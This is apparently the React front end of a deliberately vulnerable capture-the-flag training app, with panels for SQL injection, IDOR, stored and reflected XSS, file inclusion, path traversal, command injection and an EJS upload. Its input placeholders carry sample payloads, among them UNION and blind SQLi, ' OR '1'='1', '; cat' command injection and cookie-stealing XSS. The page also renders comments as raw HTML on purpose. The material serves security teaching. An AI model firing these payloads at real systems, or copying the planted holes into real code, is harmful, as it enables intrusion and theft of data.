import { useEffect, useRef, useState } from 'react'
import { Link } from 'react-router-dom'
import { API } from '../data/hints.js'
import { useScrollReveal } from '../hooks/useScrollReveal.js'

async function call(path, options = {}) {
  try {
    const res = await fetch(`${API}${path}`, { credentials: 'include', ...options })
    const text = await res.text()
    try { return JSON.parse(text) } catch { return text }
  } catch (err) {
    return { error: String(err.message) }
  }
}

function Panel({ id, title, tag, desc, children, result }) {
  return (
    <section className="lab-panel terminal-window" id={id} data-reveal-left>
      <div className="win-chrome">
        <div className="win-dots"><i /><i /><i /></div>
        <div className="win-title">{tag} — {title}</div>
        <div className="win-meta">tty1</div>
      </div>
      <div className="win-body">
        <p className="lab-desc"><span className="prompt">$</span> {desc}</p>
        {children}
        {result !== undefined && result !== null && (
          <pre className="lab-output">{typeof result === 'string' ? result : JSON.stringify(result, null, 2)}</pre>
        )}
      </div>
    </section>
  )
}

function Field({ label, value, onChange, placeholder, mono }) {
  return (
    <label className="lab-field">
      <span>{label}</span>
      <input
        className={mono ? 'mono-input' : ''}
        value={value}
        onChange={(e) => onChange(e.target.value)}
        placeholder={placeholder}
      />
    </label>
  )
}

export default function Lab() {
  const root = useRef(null)
  useScrollReveal(root)
  const [q, setQ] = useState('')
  const [searchResult, setSearchResult] = useState(null)
  const [itemExpr, setItemExpr] = useState('1')
  const [itemResult, setItemResult] = useState(null)
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [loginResult, setLoginResult] = useState(null)
  const [userId, setUserId] = useState('1')
  const [userResult, setUserResult] = useState(null)
  const [author, setAuthor] = useState('agent')
  const [comment, setComment] = useState('')
  const [comments, setComments] = useState([])
  const [pageName, setPageName] = useState('about')
  const [pageResult, setPageResult] = useState(null)
  const [fileName, setFileName] = useState('manifesto.txt')
  const [greetName, setGreetName] = useState('guest')
  const [pingHost, setPingHost] = useState('127.0.0.1')
  const [pingResult, setPingResult] = useState(null)
  const [uploadFile, setUploadFile] = useState(null)
  const [uploadResult, setUploadResult] = useState(null)
  const [viewName, setViewName] = useState('')

  const loadComments = async () => {
    const data = await call('/api/comments')
    if (Array.isArray(data)) setComments(data)
  }

  useEffect(() => { loadComments() }, [])

  const runSearch = async (e) => {
    e.preventDefault()
    setSearchResult(await call(`/api/search?q=${encodeURIComponent(q)}`))
  }

  const runItem = async (e) => {
    e.preventDefault()
    setItemResult(await call(`/api/item?id=${encodeURIComponent(itemExpr)}`))
  }

  const runLogin = async (e) => {
    e.preventDefault()
    setLoginResult(await call('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password })
    }))
  }

  const runUser = async (e) => {
    e.preventDefault()
    setUserResult(await call(`/api/users/${encodeURIComponent(userId)}`))
  }

  const postComment = async (e) => {
    e.preventDefault()
    await call('/api/comments', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ author, body: comment })
    })
    setComment('')
    loadComments()
  }

  const runPage = async (e) => {
    e.preventDefault()
    setPageResult(await call(`/page?page=${encodeURIComponent(pageName)}`))
  }

  const runPing = async (e) => {
    e.preventDefault()
    setPingResult(await call(`/api/ping?host=${encodeURIComponent(pingHost)}`))
  }

  const runUpload = async (e) => {
    e.preventDefault()
    if (!uploadFile) return
    const form = new FormData()
    form.append('file', uploadFile)
    const res = await fetch(`${API}/api/upload`, { method: 'POST', body: form })
    const data = await res.json()
    setUploadResult(data)
    if (data.filename) setViewName(data.filename)
  }

  return (
    <div className="lab" ref={root}>
      <header className="lab-hero" data-reveal>
        <div className="section-kicker">$ cd /exploit-lab</div>
        <h1>INTERACTIVE TARGETS</h1>
        <p>Every panel talks directly to the vulnerable Express server on port 7000. Payloads are in the <Link to="/">flag directory</Link>.</p>
      </header>

      <div className="lab-grid">
        <Panel id="search" tag="SQLi 06 / 07 / 15" title="Document Search" desc="String concatenation in the SQL query. Try an apostrophe, a UNION, or the vault table from the backup.">
          <form onSubmit={runSearch} className="lab-form">
            <Field label="QUERY (q)" value={q} onChange={setQ} placeholder="' UNION SELECT id, flag, flag FROM secret_flags -- " mono />
            <button className="btn btn-primary btn-sm" type="submit">RUN QUERY</button>
          </form>
          {searchResult && <pre className="lab-output">{JSON.stringify(searchResult, null, 2)}</pre>}
        </Panel>

        <Panel id="item" tag="SQLi 08" title="Boolean Blind Reader" desc="The response only says found:true or found:false. Extract one character at a time.">
          <form onSubmit={runItem} className="lab-form">
            <Field label="ID EXPRESSION" value={itemExpr} onChange={setItemExpr} placeholder="1 AND substr((SELECT flag FROM secret_flags WHERE id=8),1,1)='R'" mono />
            <button className="btn btn-primary btn-sm" type="submit">TEST</button>
          </form>
          {itemResult && <pre className="lab-output">{JSON.stringify(itemResult, null, 2)}</pre>}
        </Panel>

        <Panel id="login" tag="AUTH 03 / 04" title="Login + Role Check" desc="Break the login with SQLi for /admin, or forge the role cookie for /member.">
          <form onSubmit={runLogin} className="lab-form lab-form-wide">
            <Field label="USERNAME" value={username} onChange={setUsername} placeholder="' OR '1'='1' -- " mono />
            <Field label="PASSWORD" value={password} onChange={setPassword} placeholder="anything" mono />
            <button className="btn btn-primary btn-sm" type="submit">LOGIN</button>
          </form>
          {loginResult && <pre className="lab-output">{JSON.stringify(loginResult, null, 2)}</pre>}
          <div className="lab-links">
            <a href={`${API}/admin`} target="_blank" rel="noreferrer">/admin ↗</a>
            <a href={`${API}/member`} target="_blank" rel="noreferrer">/member ↗</a>
          </div>
        </Panel>

        <Panel id="users" tag="IDOR 05" title="User Profiles" desc="No authorization check on the numeric user id.">
          <form onSubmit={runUser} className="lab-form">
            <Field label="USER ID" value={userId} onChange={setUserId} placeholder="2" mono />
            <button className="btn btn-primary btn-sm" type="submit">FETCH</button>
          </form>
          {userResult && <pre className="lab-output">{JSON.stringify(userResult, null, 2)}</pre>}
        </Panel>

        <Panel id="comments" tag="XSS 09" title="Guestbook" desc="Comment bodies are injected into the DOM as raw HTML. This is the stored XSS sink.">
          <form onSubmit={postComment} className="lab-form lab-form-wide">
            <Field label="AUTHOR" value={author} onChange={setAuthor} placeholder="agent" />
            <Field label="BODY (RAW HTML)" value={comment} onChange={setComment} placeholder='<img src=x onerror="alert(window.__SECRET__)">' mono />
            <button className="btn btn-primary btn-sm" type="submit">POST</button>
          </form>
          <div className="comment-list">
            {comments.map((c) => (
              <div className="comment" key={c.id}>
                <span className="comment-author">{c.author}</span>
                <div className="comment-body" dangerouslySetInnerHTML={{ __html: c.body }} />
              </div>
            ))}
          </div>
        </Panel>

        <Panel id="page" tag="LFI 11" title="Page Include" desc="The page parameter is joined onto the views directory without normalization.">
          <form onSubmit={runPage} className="lab-form">
            <Field label="PAGE" value={pageName} onChange={setPageName} placeholder="../../data/secrets/lfi_flag.txt" mono />
            <button className="btn btn-primary btn-sm" type="submit">LOAD</button>
          </form>
          {pageResult && <pre className="lab-output">{String(pageResult)}</pre>}
        </Panel>

        <Panel id="download" tag="TRAVERSAL 12" title="File Download" desc="The download path is built from user input. Try walking out of the downloads folder.">
          <form onSubmit={(e) => e.preventDefault()} className="lab-form">
            <Field label="FILE" value={fileName} onChange={setFileName} placeholder="../secrets/download_flag.txt" mono />
            <a className="btn btn-primary btn-sm" href={`${API}/download?file=${encodeURIComponent(fileName)}`}>DOWNLOAD ↗</a>
          </form>
        </Panel>

        <Panel id="ping" tag="RCE 13" title="Ping Diagnostic" desc="The host value is concatenated into a shell command. Semicolons are your friend.">
          <form onSubmit={runPing} className="lab-form">
            <Field label="HOST" value={pingHost} onChange={setPingHost} placeholder="127.0.0.1; cat data/secrets/cmd_flag.txt" mono />
            <button className="btn btn-primary btn-sm" type="submit">PING</button>
          </form>
          {pingResult && <pre className="lab-output">{JSON.stringify(pingResult, null, 2)}</pre>}
        </Panel>

        <Panel id="upload" tag="RCE 14" title="Avatar Upload" desc="Any extension is accepted, and uploaded EJS files are rendered server-side.">
          <form onSubmit={runUpload} className="lab-form">
            <label className="lab-field">
              <span>FILE</span>
              <input type="file" onChange={(e) => setUploadFile(e.target.files?.[0] || null)} />
            </label>
            <button className="btn btn-primary btn-sm" type="submit">UPLOAD</button>
          </form>
          {uploadResult && <pre className="lab-output">{JSON.stringify(uploadResult, null, 2)}</pre>}
          <form onSubmit={(e) => e.preventDefault()} className="lab-form">
            <Field label="RENDER VIEW" value={viewName} onChange={setViewName} placeholder="shell.ejs" mono />
            <a className="btn btn-ghost btn-sm" href={`${API}/render?view=${encodeURIComponent(viewName)}`} target="_blank" rel="noreferrer">RENDER ↗</a>
          </form>
        </Panel>

        <Panel id="greet" tag="XSS 10" title="Reflected Greeting" desc="The name parameter is reflected into raw HTML and a non-HttpOnly cookie is set.">
          <form onSubmit={(e) => e.preventDefault()} className="lab-form">
            <Field label="NAME" value={greetName} onChange={setGreetName} placeholder='<img src=x onerror="alert(document.cookie)">' mono />
            <a className="btn btn-primary btn-sm" href={`${API}/greet?name=${encodeURIComponent(greetName)}`} target="_blank" rel="noreferrer">GREET ↗</a>
          </form>
        </Panel>
      </div>
    </div>
  )
}
